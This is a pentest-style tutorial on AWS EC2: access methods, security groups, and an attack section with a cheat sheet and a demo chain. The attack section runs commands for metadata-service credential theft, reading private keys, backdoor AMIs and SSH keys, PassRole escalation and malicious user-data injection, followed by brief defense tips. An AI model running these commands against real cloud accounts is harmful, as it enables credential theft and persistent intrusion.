# 🖥️ AWS EC2 COMPLETE GUIDE: COMPONENTS, ACCESS & EXPLOITATION WITH LIVE EXAMPLES!

## 🎨 COLOR CODE:
- 🔴 **RED** = CRITICAL/EXPLOITABLE
- 🟠 **ORANGE** = Important Actions
- 🟡 **YELLOW** = Information to Note
- 🟢 **GREEN** = Success/Found
- 🔵 **BLUE** = Commands You Type
- ➡️ **ARROW** = Key Points to Check

---

# 1. INTRODUCTION TO EC2

**Amazon Elastic Compute Cloud (Amazon EC2)** provides secure, resizable compute capacity in the cloud. It's like having virtual computers where you can run your applications, with full control over the operating system, storage, networking, and access.

```
┌─────────────────────────────────────┐
│            EC2 Instance             │
│  ┌───────────────────────────────┐  │
│  │  Operating System (Linux/Win) │  │
│  │  CPU     RAM     Storage      │  │
│  │  Public IP   Private IP       │  │
│  │  Security Group (Firewall)    │  │
│  │  Attached IAM Role (optional) │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

- **EC2** = Virtual machines in the cloud.
- **AMI** (Amazon Machine Image) = Template for the instance (OS, software).
- **Instance Type** = CPU, memory, storage capacity.
- **Key Pair** = SSH key for secure login.
- **Security Group** = Virtual firewall controlling traffic.
- **IAM Role** = Permissions the instance can use (e.g., access S3).

---

# 2. EC2 COMPONENTS EXPLANATIONS

## 🔷 A. Amazon Machine Image (AMI)

An AMI is a template that contains the software configuration (OS, application server, applications). From an AMI, you launch instances.

- **AWS AMIs** – Pre-configured, maintained by AWS (e.g., Amazon Linux, Windows Server).
- **Custom AMIs** – Created by users from their own instances (backups, golden images).

### 🔵 List available AMIs (owned by AWS)
```bash
aws ec2 describe-images --owners amazon --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" --query 'Images[*].[ImageId,Name]' --output table
```
```
-------------------------------------------------------
|                 DescribeImages                      |
+----------------------+------------------------------+
|  ami-0abcdef12345678 |  amzn2-ami-hvm-2.0.20230320-x86_64-gp2 |
+----------------------+------------------------------+
```

### 🔵 List custom AMIs (owned by you)
```bash
aws ec2 describe-images --owners self
```

### 🔴 **LIVE OUTPUT (Custom AMI)**
```json
{
    "Images": [
        {
            ➡️ "ImageId": "ami-0a1b2c3d4e5f67890",
            ➡️ "Name": "MyBackupAMI-20250318",
            "Description": "Backup of production server",
            "State": "available",
            "CreationDate": "2025-03-18T10:30:00.000Z"
        }
    ]
}
```

---

## 🔷 B. EC2 Instance Access Methods

### 🐧 Linux Instances

| Method | Description | Requirement |
|--------|-------------|-------------|
| **SSH** | Traditional secure shell using key pair | `.pem` private key |
| **EC2 Instance Connect** | Browser-based SSH using IAM permissions | IAM policy + AWS CLI |
| **Session Manager (SSM)** | No open SSH port, uses Systems Manager | SSM Agent + IAM role |

### 🟢 SSH Access
```bash
ssh -i my-key.pem ec2-user@54.123.45.67
```

### 🟢 EC2 Instance Connect (send public key)
```bash
aws ec2-instance-connect send-ssh-public-key \
    --instance-id i-1234567890abcdef0 \
    --availability-zone us-east-1a \
    --instance-os-user ec2-user \
    --ssh-public-key file://~/.ssh/id_rsa.pub
```
Then SSH normally.

### 🟢 Session Manager (no SSH needed)
```bash
aws ssm start-session --target i-1234567890abcdef0
```

### 🪟 Windows Instances

| Method | Description | Requirement |
|--------|-------------|-------------|
| **RDP** | Remote Desktop Protocol | Password (decrypted from key pair) |
| **Session Manager** | Browser-based remote PowerShell | SSM Agent + IAM role |

### 🟢 Get Windows Administrator Password
```bash
aws ec2 get-password-data --instance-id i-1234567890abcdef0 --priv-launch-key my-key.pem
```
```json
{
    "InstanceId": "i-1234567890abcdef0",
    ➡️ "PasswordData": "G!7xQ#kL9pZ2"  <─── 🔴 DECRYPTED PASSWORD!
}
```

---

## 🔷 C. Security Group

A security group acts as a virtual firewall at the **instance level**. It controls inbound and outbound traffic.

- **Inbound rules** – who can connect to the instance (SSH, RDP, HTTP, etc.).
- **Outbound rules** – what connections the instance can initiate (default allow all).

### 🔵 List security groups
```bash
aws ec2 describe-security-groups --group-ids sg-12345678
```
```json
{
    "SecurityGroups": [
        {
            "GroupId": "sg-12345678",
            "GroupName": "web-sg",
            "Description": "Web server security group",
            "IpPermissions": [
                {
                    "FromPort": 22,
                    "ToPort": 22,
                    "IpProtocol": "tcp",
                    ➡️ "IpRanges": [{"CidrIp": "0.0.0.0/0"}]  <─── 🔴 OPEN TO WORLD!
                },
                {
                    "FromPort": 80,
                    "ToPort": 80,
                    "IpProtocol": "tcp",
                    "IpRanges": [{"CidrIp": "0.0.0.0/0"}]
                }
            ],
            "IpPermissionsEgress": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [{"CidrIp": "0.0.0.0/0"}]
                }
            ]
        }
    ]
}
```

✅ **Critical to check**: `0.0.0.0/0` means open to the entire internet – a huge risk if it's SSH or RDP.

---

# 3. EXPLOITATION TECHNIQUES

## 🔴 A. Initial Access – How attackers get into an EC2 instance

### 1. **Open SSH/RDP to the world (misconfigured security group)**
If port 22 (SSH) is open to `0.0.0.0/0`, attackers can attempt brute-force password attacks or use leaked keys.

### 2. **Leaked private keys**
If a private key (`.pem`) is accidentally exposed (GitHub, S3, etc.), anyone can SSH.

### 3. **Compromised IAM credentials**
If an attacker has IAM keys, they can use EC2 Instance Connect or SSM to access instances with appropriate permissions.

### 4. **Vulnerable web application**
If the instance runs a public web app with a vulnerability (e.g., RCE), the attacker can gain a shell.

### 🔵 **Enumeration: Find instances with open SSH (22) to the world**
```bash
aws ec2 describe-security-groups --filters "Name=ip-permission.from-port,Values=22" "Name=ip-permission.cidr,Values=0.0.0.0/0" --query 'SecurityGroups[*].{ID:GroupId,Name:GroupName}'
```
```json
[
    {
        "ID": "sg-12345678",
        "Name": "web-sg"
    }
]
```

---

## 🔴 B. Persistence – Maintaining access after compromise

### 1. **Create a backdoor AMI from the instance**
An attacker can create a custom AMI of the compromised instance, then launch new instances with the same configuration (including any backdoors).

### 🔵 Create an AMI from a running instance
```bash
aws ec2 create-image --instance-id i-1234567890abcdef0 --name "Backdoor-AMI" --description "Persistent backdoor"
```
```json
{
    ➡️ "ImageId": "ami-0a1b2c3d4e5f67890"
}
```

### 2. **Add a new SSH public key to the instance**
If the attacker gains root access, they can add their own SSH public key to `~/.ssh/authorized_keys`.

### 3. **Create a new security group rule to allow access from their IP**
```bash
aws ec2 authorize-security-group-ingress --group-id sg-12345678 --protocol tcp --port 22 --cidr 203.0.113.5/32
```

### 4. **Install a reverse shell or backdoor application**
Start a process that calls back to a command & control server.

### 5. **Create a new access key for the instance's IAM role**
If the instance has an IAM role, the attacker can use the metadata service to get temporary credentials and then create new access keys for that role (if allowed).

```bash
# From within the compromised instance
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
```
```json
{
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "Token": "..."
}
```

---

## 🔴 C. Credential Access – Stealing credentials from EC2

### 1. **Instance Metadata Service (IMDS)**
The most common way to steal temporary credentials from an instance with an IAM role.

#### 🔵 Query IMDSv1 (if enabled)
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
```json
{
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "Token": "...",
    "Expiration": "2025-03-18T12:00:00Z"
}
```
➡️ 🔴 **These credentials can be used from anywhere!**

#### 🔵 IMDSv2 requires a token
```bash
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 2. **User data script**
User data can contain secrets (database passwords, API keys) passed at launch.

#### 🔵 Retrieve user data (from inside instance)
```bash
curl http://169.254.169.254/latest/user-data
```
```
DB_PASSWORD=SuperSecret123!
```

### 3. **Environment variables**
If the application runs with environment variables containing secrets, an attacker can access them.

### 4. **Local files**
- SSH private keys (`~/.ssh/id_rsa`)
- Application config files (`.env`, `config.php`)
- Shell history (`.bash_history`)

---

## 🔴 D. Privilege Escalation

### 1. **Escalate from EC2 to IAM roles**
If the instance has a powerful IAM role (e.g., AdministratorAccess), the attacker can use the stolen credentials to perform any AWS action.

#### 🔵 Use stolen credentials to list all S3 buckets
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws s3 ls
```

### 2. **Escalate via instance metadata to other services**
The stolen role might allow launching new EC2 instances, creating users, etc.

### 3. **PassRole to launch a privileged EC2 instance**
If the attacker has `iam:PassRole` and `ec2:RunInstances`, they can launch a new instance with a high-privilege role and access it.

#### 🔵 Launch an instance with an admin role
```bash
aws ec2 run-instances \
    --image-id ami-12345678 \
    --instance-type t2.micro \
    --iam-instance-profile Name=AdminRole \
    --key-name attacker-key
```

### 4. **Modify user data of a stopped instance**
If the attacker can stop an instance and modify its user data, they can inject a reverse shell script that runs at next boot.

#### 🔵 Modify user data
```bash
# Stop the instance
aws ec2 stop-instances --instance-ids i-1234567890abcdef0

# Modify user data (must be base64 encoded)
aws ec2 modify-instance-attribute --instance-id i-1234567890abcdef0 --attribute userData --value file://malicious-userdata-base64.txt

# Start the instance
aws ec2 start-instances --instance-ids i-1234567890abcdef0
```

---

# 📊 COMPLETE EC2 EXPLOITATION CHEAT SHEET

| Phase | Technique | Command / Action |
|-------|-----------|------------------|
| **Initial Access** | Open security group | `aws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 22 --cidr 0.0.0.0/0` |
| | Leaked key pair | `ssh -i leaked.pem ec2-user@<public-ip>` |
| | Web app RCE | Exploit web vulnerability to get shell |
| **Persistence** | Create AMI | `aws ec2 create-image --instance-id i-xxx --name BackdoorAMI` |
| | Add SSH key | `echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys` |
| | Security group rule | `aws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 22 --cidr attacker-ip/32` |
| **Credential Access** | IMDSv1 | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| | User data | `curl http://169.254.169.254/latest/user-data` |
| | Local files | `cat ~/.ssh/id_rsa` |
| **Privilege Escalation** | Use stolen role | `aws sts get-caller-identity` (with stolen creds) |
| | PassRole | `aws ec2 run-instances --iam-instance-profile Name=AdminRole` |
| | Modify user data | `aws ec2 modify-instance-attribute --instance-id i-xxx --attribute userData --value file://payload` |

---

# 🏁 LIVE DEMO: FULL ATTACK SCENARIO

## Scenario: Compromised IAM user with EC2 full access

### 1. Initial Access – Find instances with open SSH
```bash
aws ec2 describe-security-groups --filters "Name=ip-permission.from-port,Values=22" "Name=ip-permission.cidr,Values=0.0.0.0/0" --query 'SecurityGroups[*].GroupId' --output text
```
```
sg-12345678
```

### 2. Get instances in that security group
```bash
aws ec2 describe-instances --filters "Name=instance.group-id,Values=sg-12345678" --query 'Reservations[*].Instances[*].{ID:InstanceId,PublicIP:PublicIpAddress}' --output table
```
```
-----------------------------------
|          DescribeInstances      |
+----------------+---------------+
|      ID        |   PublicIP    |
+----------------+---------------+
|  i-1234567890  |  54.123.45.67 |
+----------------+---------------+
```

### 3. Brute-force SSH or use stolen key (if any)
Assume we have a valid key.

### 4. Inside the instance – steal IAM role credentials
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole
```
```json
{
    "AccessKeyId": "ASIAQ3EGUZME4X5Y6Z7A",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY",
    "Token": "IQoJb3JpZ2luX2VjEIX...",
    "Expiration": "2025-03-18T12:30:00Z"
}
```

### 5. Use stolen credentials to escalate
```bash
export AWS_ACCESS_KEY_ID=ASIAQ3EGUZME4X5Y6Z7A
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEIX...

aws s3 ls
```
```
2024-09-24 11:15:22 securecopbakupbuk1
```

✅ **Attacker now has the same permissions as the instance's IAM role.**

### 6. Persistence – Create a backdoor AMI
```bash
aws ec2 create-image --instance-id i-1234567890abcdef0 --name "PersistentBackdoor" --description "Hidden AMI for persistence"
```
```json
{"ImageId": "ami-0a1b2c3d4e5f67890"}
```

---

# DEFENSE TIPS

- **Never open SSH/RDP to 0.0.0.0/0** – restrict to specific IPs.
- **Use IMDSv2** and increase hop limit to prevent SSRF.
- **Rotate keys and use IAM roles instead of long-term keys.**
- **Limit IAM role permissions** – least privilege.
- **Monitor** CloudTrail for `CreateImage`, `ModifyInstanceAttribute`, etc.
- **Use EC2 Instance Connect** instead of managing SSH keys.

---

